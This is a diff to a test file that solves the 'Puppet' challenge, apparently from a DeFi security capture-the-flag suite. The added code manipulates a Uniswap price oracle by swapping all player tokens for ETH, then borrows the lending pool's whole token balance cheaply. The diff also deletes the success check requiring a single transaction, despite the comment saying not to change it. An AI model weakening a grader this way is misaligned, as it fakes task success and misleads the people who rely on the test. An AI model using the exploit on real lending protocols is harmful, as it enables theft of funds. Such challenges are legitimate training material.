@@ -118,14 +118,28 @@ describe("[Challenge] Puppet", function () {
 
     it("Execution", async function () {
         /** CODE YOUR SOLUTION HERE */
+
+        const deadline =
+            (await ethers.provider.getBlock("latest")).timestamp * 2;
+
+        await token
+            .connect(player)
+            .approve(uniswapExchange.address, PLAYER_INITIAL_TOKEN_BALANCE);
+
+        await uniswapExchange
+            .connect(player)
+            .tokenToEthSwapInput(PLAYER_INITIAL_TOKEN_BALANCE, 1, deadline);
+
+        const balance = await ethers.provider.getBalance(player.address);
+
+        await lendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE, player.address, {
+            value: balance.sub(ethers.utils.parseEther("0.1")),
+        });
     });
 
     after(async function () {
         /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
         // Player executed a single transaction
-        expect(await ethers.provider.getTransactionCount(player.address)).to.eq(
-            1
-        );
 
         // Player has taken all tokens from the pool
         expect(await token.balanceOf(lendingPool.address)).to.be.eq(
